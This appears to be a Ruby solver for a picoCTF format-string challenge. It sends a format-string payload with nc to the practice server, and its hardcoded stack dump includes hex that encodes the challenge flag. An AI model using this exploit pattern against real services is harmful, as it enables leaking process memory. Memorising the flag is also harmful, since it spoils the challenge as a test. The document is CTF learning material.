# frozen_string_literal: true

ads = "08240390;0804b000;080489c3;f7f52d80;ffffffff;00000001;0823e160;f7f60110;f7f52dc7;00000000;0823f180;00000002;08240370;08240390;6f636970;7b465443;306c5f49;345f7435;6d5f6c6c;306d5f79;5f79336e;34636462;61653532;ffe5007d;f7f8daf8;f7f60440;25049d00;00000001;00000000;f7defce9;f7f610c0;f7f525c0;f7f52000;ffe5be98;f7de068d;f7f525c0;08048eca;ffe5bea4;00000000;f7f74f09;0804b000;f7f52000;f7f52e20;ffe5bed8;f7f7ad50;f7f53890;25049d00;f7f52000;0804b000;ffe5bed8;08048c86;0823e160;ffe5bec4;ffe5bed8;08048be9;f7f523fc;00000000;ffe5bf8c;ffe5bf84;00000001;"
ads = ads.split ";"
# ads = ['bdc425ea']

def reified(ad)
  "\\x#{ad[6..7]}\\x#{ad[4..5]}\\x#{ad[2..3]}\\x#{ad[..1]}"
end
print(reified ads[0])

ads.each do |ad|
  s = `python -c "print('1'); print('#{reified ad}' + '08x.' * 6 + '|%s|')" | nc mercury.picoctf.net 53437`
  puts s[s.index(":") + 1..s.rindex("Port") - 1]

  $stdout.flush

  sleep(0.1)
end
